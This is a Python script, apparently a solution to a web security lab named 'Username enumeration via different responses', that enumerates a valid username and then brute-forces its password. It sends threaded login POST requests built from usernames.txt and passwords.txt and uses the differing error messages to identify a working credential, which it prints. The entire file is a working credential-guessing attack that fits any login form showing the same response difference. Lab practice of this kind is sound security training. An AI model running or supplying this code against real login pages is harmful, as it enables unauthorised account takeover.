import requests
import signal
import sys
import getopt
import concurrent.futures
from halo import Halo


# Handle Ctrl+c
def signal_handler(signum, frame):
  print("\nExiting...")
  print("\x1b[?25h", end="") # Make cursor visible
  sys.exit(0)


# Call the function to handle Ctrl+c
signal.signal(signal.SIGINT, signal_handler)


def get_username(url, session):
  usernames = open('usernames.txt', 'r')

  def test_usernames(username):
    username = username.strip()
    data = {'username': username, 'password': 'a'}
    response = session.post(url, data=data)

    if "Invalid username" not in response.text:
      valid_username = username
      return valid_username
    else:
      return None

  with concurrent.futures.ThreadPoolExecutor() as executor:
    results = [executor.submit(test_usernames, username) for username in usernames]

    for i in concurrent.futures.as_completed(results):
      if i.result() != None:
        valid_username = i.result()
        usernames.close()
        return valid_username


def get_password(url, session, valid_username):
  passwords = open('passwords.txt', 'r')

  def test_password(password):
    password = password.strip()
    data = {'username': valid_username, 'password': password}
    response = session.post(url, data=data)

    if "Incorrect password" not in response.text:
      valid_password = password
      return valid_password
    else:
      return None

  with concurrent.futures.ThreadPoolExecutor() as executor:
    results = [executor.submit(test_password, password) for password in passwords]

    for i in concurrent.futures.as_completed(results):
      if i.result() != None:
        valid_password = i.result()
        passwords.close()
        return valid_password


def main(argv):
  help_message = "This is the script for:\n'Username enumeration via different responses'\n\nUsage: python3 auth-1.py -u <url>/login"

  try:
    opts, args = getopt.getopt(argv, "hu:")
  except getopt.GetoptError:
    print(help_message)
    print("\x1b[?25h") # Make cursor visible
    sys.exit(1)

  for opt, arg in opts:
    if opt == "-u":
      url = arg
    elif opt == "-h":
      print(help_message)
      print("\x1b[?25h") # Make cursor visible
      sys.exit()

  session = requests.Session()

  # Create and start spinner animation
  spinner = Halo(text='Testing usernames...', spinner='bouncingBar')
  spinner.start()
  # Get valid username
  username = get_username(url, session)
  # Finish spinner
  spinner.succeed(f"The username is: \"{username}\"")

  # Create and start spinner animation
  spinner = Halo(text='Testing passwords...', spinner='bouncingBar')
  spinner.start()
  # Get valid password
  password = get_password(url, session, username)
  # Finish spinner
  spinner.succeed(f"The password is: \"{password}\"")


if __name__ == "__main__":
  print("\x1b[?25l", end="") # Hide Cursor
  main(sys.argv[1:])
  print("\x1b[?25h", end="") # Make cursor visible
  sys.exit()